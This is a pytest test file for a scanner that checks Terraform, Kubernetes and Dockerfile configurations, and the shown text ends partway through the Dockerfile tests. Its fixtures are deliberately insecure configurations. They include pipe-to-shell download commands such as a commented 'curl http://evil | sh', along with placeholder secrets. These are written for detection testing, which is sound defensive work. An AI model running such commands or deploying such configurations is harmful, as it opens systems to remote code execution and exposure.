"""Phase 3.1 — parsed IaC object models behind the three IaC scanners.

Pins the parsers (HCL2 / YAML-with-marks / Dockerfile instructions), every
precision fix the structured layer shipped (TF egress-locals-data scoping,
exact attribute names, IPv6 equality; K8s valueFrom, pod-level
securityContext inheritance, NET_RAW drop; Docker comment/continuation
handling), the honesty contracts (OPAQUE is never claimed, every parse
failure falls back to the regex engine), resource-path evidence on every
structured finding, corpus parity for all 13 IaC fixtures, and determinism.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from scanner import iac_models
from scanner.iac_docker import scan_docker
from scanner.iac_kubernetes import scan_kubernetes
from scanner.iac_models import (
    OPAQUE,
    WORKLOAD_KINDS,
    DockerInstruction,
    evaluate_docker_rules,
    evaluate_k8s_rules,
    evaluate_terraform_rules,
    parse_dockerfile,
    parse_hcl2,
    parse_k8s_documents,
)
from scanner.iac_terraform import scan_terraform

CORPUS = Path("tests/vuln-test-corpus/iac")


def _findings_for(scanner, directory, filename):
    return [
        f for f in scanner(str(directory))
        if Path(f["file"]).name == filename
    ]


def _rule_ids(findings):
    return sorted(f["rule_id"] for f in findings)


# ---------------------------------------------------------------------------
# HCL2 parser units
# ---------------------------------------------------------------------------

class TestHcl2Parser:
    def test_resource_blocks_labels_and_lines(self):
        source = (
            'resource "aws_security_group" "web" {\n'
            '  ingress {\n'
            '    cidr_blocks = ["10.0.0.0/8"]\n'
            '  }\n'
            '}\n'
        )
        parsed = parse_hcl2(source)
        assert parsed.ok
        res = parsed.blocks[0]
        assert res.kind == "resource"
        assert res.type == "aws_security_group"
        assert res.name == "web"
        assert res.line == 1 and res.end_line == 5
        ingress = res.blocks[0]
        assert ingress.type == "ingress"
        assert ingress.line == 2
        attr = ingress.attributes["cidr_blocks"]
        assert attr.value == ["10.0.0.0/8"]
        assert attr.line == 3
        assert attr.opaque is False

    def test_data_source_scoping_tokens(self):
        parsed = parse_hcl2('data "aws_caller_identity" "current" {}\n')
        assert parsed.ok
        block = parsed.blocks[0]
        assert block.kind == "data"
        assert block.type == "aws_caller_identity"
        assert block.name == "current"

    def test_multiline_list_value(self):
        source = (
            'resource "aws_security_group" "web" {\n'
            '  ingress {\n'
            '    cidr_blocks = [\n'
            '      "10.0.0.0/8",\n'
            '      "0.0.0.0/0",\n'
            '    ]\n'
            '  }\n'
            '}\n'
        )
        parsed = parse_hcl2(source)
        assert parsed.ok
        attr = parsed.blocks[0].blocks[0].attributes["cidr_blocks"]
        assert attr.value == ["10.0.0.0/8", "0.0.0.0/0"]
        assert attr.line == 3

    def test_comments_are_not_attributes(self):
        source = (
            'resource "aws_s3_bucket" "b" {\n'
            '  # acl = "public-read"\n'
            '  name = "ci-deployer" # trailing note\n'
            '}\n'
        )
        parsed = parse_hcl2(source)
        assert parsed.ok
        attrs = parsed.blocks[0].attributes
        assert "acl" not in attrs
        assert attrs["name"].value == "ci-deployer"
        assert attrs["name"].line == 3  # the attribute line, not the comment

    def test_jsonencode_body_is_opaque_not_structure(self):
        source = (
            'resource "aws_iam_role_policy" "p" {\n'
            '  name = "policy"\n'
            '  policy = jsonencode({\n'
            '    Version = "2012-10-17"\n'
            '    Statement = [{\n'
            '      Effect = "Allow"\n'
            '      Action = ["*"]\n'
            '      Resource = "*"\n'
            '    }]\n'
            '  })\n'
            '}\n'
        )
        parsed = parse_hcl2(source)
        assert parsed.ok
        attrs = parsed.blocks[0].attributes
        assert set(attrs) == {"name", "policy"}
        assert attrs["policy"].opaque is True
        assert attrs["policy"].value is OPAQUE

    def test_heredoc_value_consumes_block(self):
        source = (
            'resource "aws_s3_bucket" "b" {\n'
            '  policy = <<POLICY\n'
            '{\n'
            '  "Statement": []\n'
            '}\n'
            'POLICY\n'
            '  acl = "private"\n'
            '}\n'
        )
        parsed = parse_hcl2(source)
        assert parsed.ok
        attrs = parsed.blocks[0].attributes
        assert "Statement" not in attrs
        assert attrs["acl"].value == "private"
        assert attrs["acl"].line == 7

    def test_interpolation_marks_opaque(self):
        parsed = parse_hcl2('resource "aws_s3_bucket" "b" {\n  acl = "${var.acl}"\n}\n')
        assert parsed.ok
        attr = parsed.blocks[0].attributes["acl"]
        assert attr.opaque is True
        assert attr.value is OPAQUE

    def test_unbalanced_braces_fail_parse(self):
        parsed = parse_hcl2(
            'resource "aws_security_group" "b" {\n'
            '  ingress {\n'
            '    cidr_blocks = ["0.0.0.0/0"]\n'
        )
        assert parsed.ok is False

    def test_dynamic_ingress_block_labels(self):
        source = (
            'resource "aws_security_group" "sg" {\n'
            '  dynamic "ingress" {\n'
            '    for_each = var.rules\n'
            '    content {\n'
            '      cidr_blocks = ["0.0.0.0/0"]\n'
            '    }\n'
            '  }\n'
            '}\n'
        )
        parsed = parse_hcl2(source)
        assert parsed.ok
        dynamic = parsed.blocks[0].blocks[0]
        assert dynamic.type == "dynamic"
        assert dynamic.labels == ["ingress"]
        found = parsed.blocks[0].attrs_named("cidr_blocks")
        assert found and found[0][1].value == ["0.0.0.0/0"]


# ---------------------------------------------------------------------------
# Terraform structured rules
# ---------------------------------------------------------------------------

class TestTerraformStructured:
    def test_ingress_open_fires_with_resource_path(self, tmp_path):
        (tmp_path / "sg.tf").write_text(
            'resource "aws_security_group" "web" {\n'
            '  ingress {\n'
            '    cidr_blocks = ["0.0.0.0/0"]\n'
            '  }\n'
            '}\n', encoding="utf-8")
        findings = _findings_for(scan_terraform, tmp_path, "sg.tf")
        assert _rule_ids(findings) == ["TF_OPEN_SECURITY_GROUP_INGRESS"]
        assert findings[0]["line"] == 1  # resource header, as the corpus labels
        assert findings[0]["resource_path"] == (
            "resource.aws_security_group.web.ingress.cidr_blocks")
        assert findings[0]["snippet"].startswith("cidr_blocks")

    def test_egress_open_is_not_an_ingress_finding(self, tmp_path):
        (tmp_path / "egress.tf").write_text(
            'resource "aws_security_group" "web" {\n'
            '  egress {\n'
            '    cidr_blocks = ["0.0.0.0/0"]\n'
            '  }\n'
            '}\n', encoding="utf-8")
        assert _findings_for(scan_terraform, tmp_path, "egress.tf") == []

    def test_locals_and_modules_are_not_security_groups(self, tmp_path):
        (tmp_path / "locals.tf").write_text(
            'locals {\n'
            '  cidr_blocks = ["0.0.0.0/0"]\n'
            '}\n'
            'module "net" {\n'
            '  cidr_blocks = ["0.0.0.0/0"]\n'
            '}\n', encoding="utf-8")
        assert _findings_for(scan_terraform, tmp_path, "locals.tf") == []

    def test_data_source_security_group_is_not_deployed(self, tmp_path):
        (tmp_path / "data.tf").write_text(
            'data "aws_security_group" "lookup" {\n'
            '  ingress {\n'
            '    cidr_blocks = ["0.0.0.0/0"]\n'
            '  }\n'
            '}\n', encoding="utf-8")
        assert _findings_for(scan_terraform, tmp_path, "data.tf") == []

    def test_security_group_rule_type_scoping(self, tmp_path):
        (tmp_path / "rules.tf").write_text(
            'resource "aws_security_group_rule" "in" {\n'
            '  type              = "ingress"\n'
            '  cidr_blocks       = ["0.0.0.0/0"]\n'
            '}\n'
            'resource "aws_security_group_rule" "out" {\n'
            '  type              = "egress"\n'
            '  cidr_blocks       = ["0.0.0.0/0"]\n'
            '}\n'
            'resource "aws_security_group_rule" "opaque" {\n'
            '  type              = var.rule_type\n'
            '  cidr_blocks       = ["0.0.0.0/0"]\n'
            '}\n', encoding="utf-8")
        findings = _findings_for(scan_terraform, tmp_path, "rules.tf")
        assert _rule_ids(findings) == ["TF_OPEN_SECURITY_GROUP_INGRESS"]
        assert findings[0]["line"] == 1

    def test_ipv6_equality_beats_substring(self, tmp_path):
        (tmp_path / "v6.tf").write_text(
            'resource "aws_security_group" "scoped" {\n'
            '  ingress {\n'
            '    ipv6_cidr_blocks = ["2001:db8::/0"]\n'
            '  }\n'
            '}\n'
            'resource "aws_security_group" "world" {\n'
            '  ingress {\n'
            '    ipv6_cidr_blocks = ["::/0"]\n'
            '  }\n'
            '}\n', encoding="utf-8")
        findings = _findings_for(scan_terraform, tmp_path, "v6.tf")
        assert _rule_ids(findings) == ["TF_OPEN_IPV6_INGRESS"]
        assert findings[0]["line"] == 6  # only the ::/0 resource

    def test_multiline_cidr_list_still_fires(self, tmp_path):
        (tmp_path / "multi.tf").write_text(
            'resource "aws_security_group" "web" {\n'
            '  ingress {\n'
            '    cidr_blocks = [\n'
            '      "10.0.0.0/8",\n'
            '      "0.0.0.0/0"\n'
            '    ]\n'
            '  }\n'
            '}\n', encoding="utf-8")
        findings = _findings_for(scan_terraform, tmp_path, "multi.tf")
        assert _rule_ids(findings) == ["TF_OPEN_SECURITY_GROUP_INGRESS"]

    def test_public_acl_on_bucket_only(self, tmp_path):
        (tmp_path / "acl.tf").write_text(
            'resource "aws_s3_bucket" "pub" {\n'
            '  acl = "public-read"\n'
            '  server_side_encryption_configuration {\n'
            '    rule {\n'
            '      apply_server_side_encryption_by_default {\n'
            '        sse_algorithm = "AES256"\n'
            '      }\n'
            '    }\n'
            '  }\n'
            '}\n'
            'locals {\n'
            '  acl = "public-read"\n'
            '}\n', encoding="utf-8")
        findings = _findings_for(scan_terraform, tmp_path, "acl.tf")
        assert _rule_ids(findings) == ["TF_PUBLIC_S3_ACL"]
        assert findings[0]["resource_path"] == "resource.aws_s3_bucket.pub.acl"

    def test_block_public_access_counts_once(self, tmp_path):
        (tmp_path / "pab.tf").write_text(
            'resource "aws_s3_bucket_public_access_block" "pab" {\n'
            '  block_public_acls   = false\n'
            '  block_public_policy = false\n'
            '  ignore_public_acls  = true\n'
            '  restrict_public_buckets = true\n'
            '}\n', encoding="utf-8")
        findings = _findings_for(scan_terraform, tmp_path, "pab.tf")
        assert _rule_ids(findings) == ["TF_S3_BLOCK_PUBLIC_ACCESS_DISABLED"]
        assert findings[0]["line"] == 1

    def test_unencrypted_bucket_respects_encryption_config(self, tmp_path):
        (tmp_path / "enc.tf").write_text(
            'resource "aws_s3_bucket" "plain" {\n'
            '}\n'
            'resource "aws_s3_bucket" "inline" {\n'
            '  server_side_encryption_configuration {\n'
            '    rule {\n'
            '      apply_server_side_encryption_by_default {\n'
            '        sse_algorithm = "AES256"\n'
            '      }\n'
            '    }\n'
            '  }\n'
            '}\n'
            'resource "aws_s3_bucket" "linked" {\n'
            '}\n'
            'resource "aws_s3_bucket_server_side_encryption_configuration" "k" {\n'
            '  bucket = aws_s3_bucket.linked.id\n'
            '  rule {\n'
            '    apply_server_side_encryption_by_default {\n'
            '      sse_algorithm = "aws:kms"\n'
            '    }\n'
            '  }\n'
            '}\n', encoding="utf-8")
        findings = _findings_for(scan_terraform, tmp_path, "enc.tf")
        # Core intent: only the `plain` bucket (no inline/sibling encryption)
        # is flagged for encryption; `inline` and `linked` are respected.
        # G21: empty buckets (plain, linked) may also emit S3 companion
        # posture findings (versioning/logging/replication absence); those are
        # genuine and are asserted separately in test_g21_terraform_posture.
        unencrypted = [
            f for f in findings if f["rule_id"] == "TF_UNENCRYPTED_S3_BUCKET"
        ]
        assert [f["line"] for f in unencrypted] == [1]

    def test_exact_attribute_names_stop_double_fire(self, tmp_path):
        (tmp_path / "rds.tf").write_text(
            'resource "aws_db_instance" "d" {\n'
            '  storage_encrypted = false\n'
            '}\n', encoding="utf-8")
        findings = _findings_for(scan_terraform, tmp_path, "rds.tf")
        assert _rule_ids(findings) == ["TF_RDS_STORAGE_NOT_ENCRYPTED"]

    def test_publicly_accessible_and_ebs_encrypted(self, tmp_path):
        (tmp_path / "mix.tf").write_text(
            'resource "aws_db_instance" "d" {\n'
            '  publicly_accessible = true\n'
            '  storage_encrypted   = true\n'
            '}\n'
            'resource "aws_ebs_volume" "v" {\n'
            '  encrypted = false\n'
            '}\n', encoding="utf-8")
        findings = _findings_for(scan_terraform, tmp_path, "mix.tf")
        assert _rule_ids(findings) == [
            "TF_EBS_ENCRYPTION_DISABLED",
            "TF_RDS_PUBLICLY_ACCESSIBLE",
        ]
        by_rule = {f["rule_id"]: f for f in findings}
        assert by_rule["TF_RDS_PUBLICLY_ACCESSIBLE"]["line"] == 1
        assert by_rule["TF_EBS_ENCRYPTION_DISABLED"]["line"] == 5

    def test_opaque_references_never_claimed(self, tmp_path):
        (tmp_path / "opaque.tf").write_text(
            'resource "aws_s3_bucket" "b" {\n'
            '  acl = var.bucket_acl\n'
            '  server_side_encryption_configuration {\n'
            '    rule {\n'
            '      apply_server_side_encryption_by_default {\n'
            '        sse_algorithm = "AES256"\n'
            '      }\n'
            '    }\n'
            '  }\n'
            '}\n'
            'resource "aws_db_instance" "d" {\n'
            '  publicly_accessible = var.pub\n'
            '  storage_encrypted   = var.enc\n'
            '}\n', encoding="utf-8")
        assert _findings_for(scan_terraform, tmp_path, "opaque.tf") == []

    def test_kitchen_sink_covers_every_structured_rule(self, tmp_path):
        (tmp_path / "sink.tf").write_text(
            'resource "aws_security_group" "open" {\n'
            '  ingress {\n'
            '    cidr_blocks = ["0.0.0.0/0"]\n'
            '  }\n'
            '}\n'
            'resource "aws_security_group" "open6" {\n'
            '  ingress {\n'
            '    ipv6_cidr_blocks = ["::/0"]\n'
            '  }\n'
            '}\n'
            'resource "aws_s3_bucket" "pub" {\n'
            '  acl = "public-read"\n'
            '}\n'
            'resource "aws_s3_bucket_public_access_block" "pab" {\n'
            '  block_public_acls = false\n'
            '}\n'
            'resource "aws_s3_bucket" "plain" {\n'
            '}\n'
            'resource "aws_db_instance" "rds" {\n'
            '  publicly_accessible = true\n'
            '  storage_encrypted   = false\n'
            '}\n'
            'resource "aws_ebs_volume" "ebs" {\n'
            '  encrypted = false\n'
            '}\n', encoding="utf-8")
        from scanner.iac_terraform import STRUCTURED_RULE_IDS
        findings = _findings_for(scan_terraform, tmp_path, "sink.tf")
        # Core intent: every structured rule fires on this fixture. G21: the
        # empty "plain" bucket may also emit S3 companion posture findings
        # (not in STRUCTURED_RULE_IDS); they are genuine and are asserted
        # separately in test_g21_terraform_posture.
        assert set(STRUCTURED_RULE_IDS) <= set(_rule_ids(findings))

    def test_parse_failure_falls_back_to_regex_engine(self, tmp_path):
        (tmp_path / "broken.tf").write_text(
            'resource "aws_security_group" "b" {\n'
            '  ingress {\n'
            '    cidr_blocks = ["0.0.0.0/0"]\n', encoding="utf-8")
        findings = _findings_for(scan_terraform, tmp_path, "broken.tf")
        assert _rule_ids(findings) == ["TF_OPEN_SECURITY_GROUP_INGRESS"]
        assert findings[0]["line"] == 1  # logical-unit start, as before
        assert "resource_path" not in findings[0]  # regex finding: no evidence

    def test_iam_rules_stay_on_regex_path(self, tmp_path):
        (tmp_path / "iam.tf").write_text(
            'resource "aws_iam_role_policy" "p" {\n'
            '  name = "policy"\n'
            '  policy = jsonencode({\n'
            '    Statement = [{\n'
            '      Action   = "*"\n'
            '      Resource = "*"\n'
            '    }]\n'
            '  })\n'
            '}\n', encoding="utf-8")
        findings = _findings_for(scan_terraform, tmp_path, "iam.tf")
        assert _rule_ids(findings) == ["TF_IAM_JSONENCODE_WILDCARD"]

    # -- corpus parity ------------------------------------------------------

    def test_corpus_open_security_group(self):
        findings = _findings_for(
            scan_terraform, CORPUS / "terraform", "open_security_group.tf")
        assert [(f["rule_id"], f["line"]) for f in findings] == [
            ("TF_OPEN_SECURITY_GROUP_INGRESS", 1)]

    def test_corpus_public_bucket(self):
        findings = _findings_for(
            scan_terraform, CORPUS / "terraform", "public_bucket.tf")
        assert sorted((f["rule_id"], f["line"]) for f in findings) == [
            ("TF_PUBLIC_S3_ACL", 1),
            ("TF_UNENCRYPTED_S3_BUCKET", 1),
        ]

    def test_corpus_public_database(self):
        findings = _findings_for(
            scan_terraform, CORPUS / "terraform", "public_database.tf")
        assert sorted(f["rule_id"] for f in findings) == [
            "TF_RDS_PUBLICLY_ACCESSIBLE",
            "TF_RDS_STORAGE_NOT_ENCRYPTED",
        ]

    def test_corpus_secure_baseline_quiet(self):
        findings = _findings_for(
            scan_terraform, CORPUS / "terraform", "secure_baseline.tf")
        assert findings == []


# ---------------------------------------------------------------------------
# Kubernetes parser + rules
# ---------------------------------------------------------------------------

class TestKubernetesStructured:
    def test_parse_marks_line_numbers(self):
        source = (
            "apiVersion: v1\n"
            "kind: Pod\n"
            "metadata:\n"
            "  name: x\n"
            "spec:\n"
            "  hostNetwork: true\n"
            "  containers:\n"
            "    - name: c\n"
            "      image: nginx:1.25\n"
        )
        docs = parse_k8s_documents(source)
        assert docs is not None and len(docs) == 1
        doc = docs[0]
        assert doc.kind == "Pod"
        assert doc.lines[("spec", "hostNetwork")] == 6
        assert doc.lines[("spec", "containers", 0, "image")] == 9

    def test_bool_and_int_typed_values(self):
        source = (
            "apiVersion: v1\n"
            "kind: Pod\n"
            "spec:\n"
            "  securityContext:\n"
            "    runAsUser: 0\n"
            "  containers:\n"
            "    - name: c\n"
            "      image: nginx:1.25\n"
            "      securityContext:\n"
            "        runAsNonRoot: true\n"
            "        privileged: false\n"
        )
        docs = parse_k8s_documents(source)
        container = docs[0].data["spec"]["containers"][0]
        sc = container["securityContext"]
        assert sc["runAsNonRoot"] is True
        assert sc["privileged"] is False
        assert docs[0].data["spec"]["securityContext"]["runAsUser"] == 0

    def test_valuefrom_secretref_is_not_a_hardcoded_secret(self, tmp_path):
        (tmp_path / "secretref.yaml").write_text(
            "apiVersion: v1\n"
            "kind: Pod\n"
            "metadata:\n"
            "  name: db\n"
            "spec:\n"
            "  containers:\n"
            "    - name: db\n"
            "      image: postgres:16\n"
            "      env:\n"
            "        - name: POSTGRES_PASSWORD\n"
            "          valueFrom:\n"
            "            secretKeyRef:\n"
            "              name: db-secret\n"
            "              key: password\n", encoding="utf-8")
        findings = _findings_for(scan_kubernetes, tmp_path, "secretref.yaml")
        secret_ids = [f["rule_id"] for f in findings if "ENV" in f["rule_id"]]
        assert secret_ids == []

    def test_literal_env_secret_still_fires_at_name_line(self, tmp_path):
        (tmp_path / "env.yaml").write_text(
            "apiVersion: v1\n"
            "kind: Pod\n"
            "metadata:\n"
            "  name: db\n"
            "spec:\n"
            "  containers:\n"
            "    - name: db\n"
            "      image: postgres:16\n"
            "      env:\n"
            "        - name: POSTGRES_PASSWORD\n"
            "          value: hunter2\n", encoding="utf-8")
        findings = _findings_for(scan_kubernetes, tmp_path, "env.yaml")
        hits = [f for f in findings if f["rule_id"] == "K8S_POSTGRES_PASSWORD_ENV"]
        assert len(hits) == 1
        assert hits[0]["line"] == 10  # the name key line
        assert hits[0]["resource_path"] == (
            "spec.containers[0].env[0].name")

    def test_commented_out_manifest_line_is_inert(self, tmp_path):
        (tmp_path / "comments.yaml").write_text(
            "apiVersion: v1\n"
            "kind: Pod\n"
            "metadata:\n"
            "  name: documented\n"
            "# hostNetwork: true\n"
            "spec:\n"
            "  containers:\n"
            "    - name: c\n"
            "      # image: nginx:latest\n"
            "      image: nginx:1.25\n"
            "      securityContext:\n"
            "        runAsNonRoot: true\n"
            "        readOnlyRootFilesystem: true\n"
            "        allowPrivilegeEscalation: false\n"
            "        capabilities:\n"
            "          drop: [\"ALL\"]\n"
            "      resources:\n"
            "        limits:\n"
            "          cpu: \"100m\"\n", encoding="utf-8")
        assert _findings_for(scan_kubernetes, tmp_path, "comments.yaml") == []

    def test_net_raw_drop_is_hardening_not_finding(self, tmp_path):
        (tmp_path / "drop.yaml").write_text(
            "apiVersion: v1\n"
            "kind: Deployment\n"
            "metadata:\n"
            "  name: d\n"
            "spec:\n"
            "  template:\n"
            "    spec:\n"
            "      containers:\n"
            "        - name: a\n"
            "          image: nginx:1.25\n"
            "          securityContext:\n"
            "            capabilities:\n"
            "              drop:\n"
            "                - NET_RAW\n", encoding="utf-8")
        findings = _findings_for(scan_kubernetes, tmp_path, "drop.yaml")
        assert [f for f in findings if f["rule_id"] == "K8S_NET_RAW_CAPABILITY"] == []

    def test_net_raw_add_still_fires(self, tmp_path):
        (tmp_path / "add.yaml").write_text(
            "apiVersion: v1\n"
            "kind: Pod\n"
            "metadata:\n"
            "  name: p\n"
            "spec:\n"
            "  containers:\n"
            "    - name: a\n"
            "      image: nginx:1.25\n"
            "      securityContext:\n"
            "        capabilities:\n"
            "          add:\n"
            "            - NET_RAW\n", encoding="utf-8")
        findings = _findings_for(scan_kubernetes, tmp_path, "add.yaml")
        hits = [f for f in findings if f["rule_id"] == "K8S_NET_RAW_CAPABILITY"]
        assert len(hits) == 1
        assert hits[0]["resource_path"] == (
            "spec.containers[0].securityContext.capabilities.add[0]")

    def test_pod_level_securitycontext_inherited_from_sibling(self, tmp_path):
        (tmp_path / "inherit.yaml").write_text(
            "apiVersion: v1\n"
            "kind: Pod\n"
            "metadata:\n"
            "  name: inherited-context\n"
            "spec:\n"
            "  securityContext:\n"
            "    runAsNonRoot: true\n"
            "    allowPrivilegeEscalation: false\n"
            "    capabilities:\n"
            "      drop: [\"ALL\"]\n"
            "  containers:\n"
            "    - name: app\n"
            "      image: acme/app:1.0.0\n"
            "      securityContext:\n"
            "        readOnlyRootFilesystem: true\n"
            "      resources:\n"
            "        limits:\n"
            "          cpu: \"250m\"\n"
            "          memory: \"128Mi\"\n", encoding="utf-8")
        assert _findings_for(
            scan_kubernetes, tmp_path, "inherit.yaml") == []

    def test_one_container_controls_do_not_satisfy_the_next(self, tmp_path):
        (tmp_path / "tricky.yaml").write_text(
            "apiVersion: v1\n"
            "kind: Pod\n"
            "metadata:\n"
            "  name: tricky\n"
            "spec:\n"
            "  containers:\n"
            "    - name: first\n"
            "      image: a:1.0\n"
            "      securityContext:\n"
            "        runAsNonRoot: true\n"
            "        readOnlyRootFilesystem: true\n"
            "        allowPrivilegeEscalation: false\n"
            "        capabilities:\n"
            "          drop: [\"ALL\"]\n"
            "      resources:\n"
            "        limits:\n"
            "          cpu: \"100m\"\n"
            "    - name: second\n"
            "      image: b:1.0\n", encoding="utf-8")
        findings = _findings_for(scan_kubernetes, tmp_path, "tricky.yaml")
        missing = [f for f in findings if f["rule_id"].startswith("K8S_MISSING_")]
        # Only the second container lacks the controls; every missing rule
        # anchors on the second container's item line.
        assert missing
        assert all(f["line"] == 18 for f in missing)
        assert all(f["resource_path"] == "spec.containers[1]" for f in missing)

    def test_non_workload_documents_are_ignored(self, tmp_path):
        (tmp_path / "configmap.yaml").write_text(
            "apiVersion: v1\n"
            "kind: ConfigMap\n"
            "metadata:\n"
            "  name: notes\n"
            "data:\n"
            "  privileged: true\n"
            "  hostNetwork: true\n"
            "  image: nginx:latest\n", encoding="utf-8")
        assert _findings_for(scan_kubernetes, tmp_path, "configmap.yaml") == []

    def test_json_manifest_recall_fix(self, tmp_path):
        (tmp_path / "manifest.json").write_text(
            '{\n'
            '  "apiVersion": "v1",\n'
            '  "kind": "Pod",\n'
            '  "metadata": {"name": "json-pod"},\n'
            '  "spec": {\n'
            '    "hostNetwork": true,\n'
            '    "containers": [{\n'
            '      "name": "c",\n'
            '      "image": "nginx:1.25",\n'
            '      "securityContext": {\n'
            '        "runAsNonRoot": true,\n'
            '        "readOnlyRootFilesystem": true,\n'
            '        "allowPrivilegeEscalation": false,\n'
            '        "capabilities": {"drop": ["ALL"]}\n'
            '      },\n'
            '      "resources": {"limits": {"cpu": "100m"}}\n'
            '    }]\n'
            '  }\n'
            '}\n', encoding="utf-8")
        findings = _findings_for(scan_kubernetes, tmp_path, "manifest.json")
        assert _rule_ids(findings) == ["K8S_HOST_NETWORK"]

    def test_invalid_yaml_falls_back_to_regex_engine(self, tmp_path):
        (tmp_path / "broken.yaml").write_text(
            "apiVersion: v1\n"
            "kind: Pod\n"
            "spec: {hostNetwork: true\n", encoding="utf-8")
        docs = parse_k8s_documents(
            (tmp_path / "broken.yaml").read_text(encoding="utf-8"))
        assert docs is None
        findings = _findings_for(scan_kubernetes, tmp_path, "broken.yaml")
        assert _rule_ids(findings) == ["K8S_HOST_NETWORK"]
        assert findings[0]["line"] == 3

    def test_pyyaml_absent_degrades_to_regex(self, tmp_path, monkeypatch):
        monkeypatch.setattr(iac_models, "yaml", None)
        (tmp_path / "pod.yaml").write_text(
            "apiVersion: v1\n"
            "kind: Pod\n"
            "spec:\n"
            "  hostNetwork: true\n"
            "  containers:\n"
            "    - name: c\n"
            "      image: nginx:1.25\n"
            "      securityContext:\n"
            "        runAsNonRoot: true\n"
            "        readOnlyRootFilesystem: true\n"
            "        allowPrivilegeEscalation: false\n"
            "        capabilities:\n"
            "          drop: [\"ALL\"]\n"
            "      resources:\n"
            "        limits:\n"
            "          cpu: \"100m\"\n", encoding="utf-8")
        findings = _findings_for(scan_kubernetes, tmp_path, "pod.yaml")
        assert _rule_ids(findings) == ["K8S_HOST_NETWORK"]

    def test_alias_within_document_resolves_to_same_object(self):
        source = (
            "apiVersion: v1\n"
            "kind: Pod\n"
            "metadata:\n"
            "  name: a\n"
            "spec:\n"
            "  securityContext: &sc\n"
            "    runAsNonRoot: true\n"
            "  containers:\n"
            "    - name: c1\n"
            "      image: nginx:1.25\n"
            "      securityContext: *sc\n"
            "    - name: c2\n"
            "      image: nginx:1.25\n"
        )
        docs = parse_k8s_documents(source)
        assert docs is not None and len(docs) == 1
        doc = docs[0]
        spec = doc.data["spec"]
        # The alias resolves to the SAME object — shared structure stays
        # shared, and the inherited control satisfies the container.
        assert spec["containers"][0]["securityContext"] is spec["securityContext"]
        findings = evaluate_k8s_rules(
            _k8s_rule_args()[0], _k8s_rule_args()[1], docs, source)
        assert "K8S_MISSING_RUN_AS_NON_ROOT" not in {
            f["rule_id"] for f in findings}

    def test_anchor_across_documents_is_invalid_yaml(self):
        # Anchors do not cross `---` boundaries per the YAML spec; the
        # honest outcome is parse failure -> the regex fallback path.
        source = (
            "apiVersion: v1\n"
            "kind: Pod\n"
            "metadata:\n"
            "  name: a\n"
            "spec: &shared\n"
            "  hostNetwork: true\n"
            "---\n"
            "apiVersion: v1\n"
            "kind: Pod\n"
            "metadata:\n"
            "  name: b\n"
            "spec: *shared\n"
        )
        assert parse_k8s_documents(source) is None

    def test_kitchen_sink_covers_every_k8s_rule(self, tmp_path):
        (tmp_path / "sink.yaml").write_text(
            "apiVersion: v1\n"
            "kind: Pod\n"
            "metadata:\n"
            "  name: sink\n"
            "spec:\n"
            "  hostNetwork: true\n"
            "  hostPID: true\n"
            "  hostIPC: true\n"
            "  containers:\n"
            "    - name: c\n"
            "      image: nginx:latest\n"
            "      imagePullPolicy: Always\n"
            "      securityContext:\n"
            "        privileged: true\n"
            "        allowPrivilegeEscalation: true\n"
            "        runAsUser: 0\n"
            "        readOnlyRootFilesystem: false\n"
            "        capabilities:\n"
            "          add:\n"
            "            - NET_RAW\n"
            "      env:\n"
            "        - name: POSTGRES_PASSWORD\n"
            "          value: hunter2\n"
            "        - name: AWS_ACCESS_KEY_ID\n"
            "          value: AKIAEXAMPLE\n"
            # 2026-10-21: a second, entirely unhardened container so the
            # absence-based rules (K8S_MISSING_ALLOW_PRIVILEGE_ESCALATION,
            # K8S_MISSING_NET_RAW_DROP, ...) have a trigger; container 1's
            # explicitly bad values keep the presence rules covered.
            "    - name: unhardened\n"
            "      image: acme/sidecar:1.0\n", encoding="utf-8")
        from scanner.iac_kubernetes import MISSING_RULES, RULES
        expected = (
            {r["rule_id"] for r in RULES}
            | {r["rule_id"] for r in MISSING_RULES}
        )
        findings = _findings_for(scan_kubernetes, tmp_path, "sink.yaml")
        assert set(_rule_ids(findings)) == expected

    # -- corpus parity ------------------------------------------------------

    def test_corpus_host_network(self):
        findings = _findings_for(
            scan_kubernetes, CORPUS / "k8s", "host_network.yaml")
        assert [(f["rule_id"], f["line"]) for f in findings] == [
            ("K8S_HOST_NETWORK", 6)]
        assert findings[0]["resource_path"] == "spec.hostNetwork"

    def test_corpus_privileged_pod(self):
        findings = _findings_for(
            scan_kubernetes, CORPUS / "k8s", "privileged_pod.yaml")
        assert [(f["rule_id"], f["line"]) for f in findings] == [
            ("K8S_PRIVILEGED_CONTAINER", 11)]
        assert findings[0]["resource_path"] == (
            "spec.containers[0].securityContext.privileged")

    def test_corpus_pod_level_nonroot_quiet(self):
        findings = _findings_for(
            scan_kubernetes, CORPUS / "k8s", "pod_level_nonroot.yaml")
        assert findings == []


def _k8s_rule_args():
    from scanner.iac_kubernetes import MISSING_RULES, RULES
    return RULES, MISSING_RULES


# ---------------------------------------------------------------------------
# Dockerfile parser + rules
# ---------------------------------------------------------------------------

class TestDockerStructured:
    def test_parser_joins_continuations_and_drops_comments(self):
        source = (
            "# syntax=docker/dockerfile:1\n"
            "FROM alpine:3.19\n"
            "RUN apt-get update \\\n"
            "    && apt-get install -y curl \\\n"
            "    && rm -rf /var/lib/apt/lists/*\n"
            "USER app\n"
        )
        instructions = parse_dockerfile(source)
        assert instructions is not None
        ops = [ins.op for ins in instructions]
        assert ops == ["FROM", "RUN", "USER"]
        assert instructions[1].line == 3
        assert "apt-get update && apt-get install -y curl" in instructions[1].args

    def test_multiline_curl_pipe_is_recognised(self, tmp_path):
        (tmp_path / "Dockerfile").write_text(
            "FROM alpine:3.19\n"
            "RUN curl -fsSL https://example.com/install.sh \\\n"
            "    | sh\n", encoding="utf-8")
        findings = _findings_for(scan_docker, tmp_path, "Dockerfile")
        hits = [f for f in findings if f["rule_id"] == "DOCKER_CURL_PIPE_SHELL"]
        assert len(hits) == 1
        assert hits[0]["line"] == 2  # the instruction's first physical line

    def test_commented_out_commands_are_inert(self, tmp_path):
        (tmp_path / "Dockerfile").write_text(
            "# curl http://evil | sh\n"
            "# chmod 777 /app\n"
            "# RUN apt-get upgrade\n"
            "FROM alpine:3.19\n"
            "USER app\n", encoding="utf-8")
        findings = _findings_for(scan_docker, tmp_path, "Dockerfile")
        assert _rule_ids(findings) == []

    def test_from_tag_parsing_boundaries(self, tmp_path):
        (tmp_path / "Dockerfile").write_text(
            "FROM node:latest\n"
            "FROM alpine\n"
            "FROM registry:5000/nginx:1.2\n"
            "FROM alpine@sha256:0123456789abcdef\n"
            "USER app\n", encoding="utf-8")
